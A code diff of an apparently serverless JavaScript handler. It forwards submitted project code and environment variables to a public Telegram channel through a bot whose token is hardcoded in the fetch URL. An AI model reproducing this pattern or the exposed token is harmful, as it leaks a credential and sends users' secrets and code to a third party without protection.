@@ -5,38 +5,58 @@ export default {
       "Access-Control-Allow-Headers": "Content-Type", 
       "Access-Control-Allow-Methods": "POST, OPTIONS" 
     };
-    if (request.method === "OPTIONS") return new Response(null, { headers });
+    
+    if (request.method === "OPTIONS") {
+      return new Response(null, { headers });
+    }
     
     try {
       const data = await request.json();
       const { user_id, project_name, code, environment_variables } = data;
 
-      // 📝 بناء الرسالة البرمجية الصافية لضمان قراءتها بدقة 100%
-      const messageBody = [
-        `ID:[${user_id}]`,
-        `PRJ:[${project_name}]`,
-        `\n[CODE_BLOCK]`,
-        code,
-        `[CODE_BLOCK]`,
-        `\n[VARS_BLOCK]`,
-        JSON.stringify(environment_variables),
-        `[VARS_BLOCK]`,
-        `\n---METADATA---{"uid":"${user_id}","pid":"${project_name}"}---METADATA---`
+      // ========== v11.0 EXACT STRUCTURE ==========
+      // Plain text only - NO HTML, NO formatting, NO markdown
+      const plainMessage = [
+        `ID:${user_id}`,
+        `PRJ:${project_name}`,
+        `[CODE_START]`,
+        `${code}`,
+        `[CODE_END]`,
+        `[VARS_START]`,
+        `${JSON.stringify(environment_variables)}`,
+        `[VARS_END]`,
+        `---METADATA---${JSON.stringify({ uid: user_id, pid: project_name })}---METADATA---`
       ].join('\n');
 
-      await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
+      // Send to Telegram with parse_mode = empty (plain text)
+      const telegramResponse = await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           chat_id: "@nejm_njm", 
-          text: messageBody,
-          disable_web_page_preview: true // منع تليجرام من العبث بالرابط
+          text: plainMessage,
+          disable_web_page_preview: true,
+          disable_notification: false
+          // NO parse_mode parameter = plain text only
         })
       });
 
-      return new Response(JSON.stringify({ success: true }), { headers });
+      const telegramResult = await telegramResponse.json();
+      
+      if (!telegramResult.ok) {
+        throw new Error(`Telegram API error: ${telegramResult.description}`);
+      }
+
+      return new Response(JSON.stringify({ 
+        success: true, 
+        message_id: telegramResult.result.message_id 
+      }), { headers });
+      
     } catch (e) {
-      return new Response(JSON.stringify({ error: e.message }), { status: 500, headers });
+      return new Response(JSON.stringify({ 
+        error: e.message,
+        success: false 
+      }), { status: 500, headers });
     }
   }
 };
